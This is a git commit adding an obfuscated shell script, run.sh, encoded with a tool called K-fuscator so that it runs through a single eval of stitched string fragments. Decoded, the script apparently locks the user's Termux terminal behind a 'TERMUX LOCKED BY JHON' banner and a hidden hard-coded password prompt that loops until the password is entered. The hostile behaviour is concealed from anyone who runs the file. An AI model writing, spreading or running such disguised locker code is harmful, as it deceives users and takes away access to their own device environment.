ae8a8f2167e9ce13e860925669a4c321b272de87
MR JHON <151718020+MR-JHONz@users.noreply.github.com>
2024-03-03 18:14:54 +0700

    Add files via upload

---
+++ run.sh
@@ -0,0 +1,6 @@
+# Encrypted by K-fuscator
+# Github- https://github.com/KasRoudra/k-fuscator
+
+z="
+";Gz='{';UBz='tc/b';xz='o';Iz='r';KBz='done';Qz='MUX ';sz=' != ';HBz='read';Nz=' "| ';rz='put"';FBz='ter ';ez=' loc';bz='Pani';dz='"';Xz='_err';LBz='sour';NBz='data';Jz='echo';Rz='LOCK';OBz='/dat';tz='"$pa';yz='disp';SBz='es/u';VBz='ash.';gz='rmux';ZBz='_ter';Zz=' "Pa';Tz='Y JH';IBz=' -s ';fz='k_te';CBz='er';Az='func';Pz=' TER';vz='rd" ';kz='="sa';uz='sswo';Sz='ED B';hz=' {';Wz='}';wz=']; d';Ez='_ban';Dz='play';Yz='or {';ABz='lay_';EBz=' "En';Oz='    ';cz='k...';Hz='clea';BBz='bann';DBz='erro';JBz='t';mz='inpu';XBz='rc';Lz='----';Vz=' |"';jz='word';Kz=' "--';TBz='sr/e';PBz='a/co';Mz='--"';lz='n"';Cz=' dis';Fz='ner ';nz='t=""';qz='"$in';iz='pass';WBz='bash';Uz='ON  ';QBz='m.te';GBz=':"';oz='whil';RBz='/fil';az='nik ';MBz='ce /';YBz='lock';aBz='mux';pz='e [ ';Bz='tion';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$z$Hz$Iz$z$Jz$Kz$Lz$Lz$Lz$Lz$Lz$Lz$Lz$Lz$Mz$z$Jz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Oz$Vz$z$Jz$Kz$Lz$Lz$Lz$Lz$Lz$Lz$Lz$Lz$Mz$z$Wz$z$Az$Bz$Cz$Dz$Xz$Yz$z$Jz$Zz$az$bz$cz$dz$z$Wz$z$Az$Bz$ez$fz$gz$hz$z$iz$jz$kz$lz$z$mz$nz$z$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$z$yz$ABz$BBz$CBz$z$yz$ABz$DBz$Iz$z$Jz$EBz$FBz$iz$jz$GBz$z$HBz$IBz$mz$JBz$z$KBz$z$LBz$MBz$NBz$OBz$PBz$QBz$gz$RBz$SBz$TBz$UBz$VBz$WBz$XBz$z$Wz$z$YBz$ZBz$aBz"
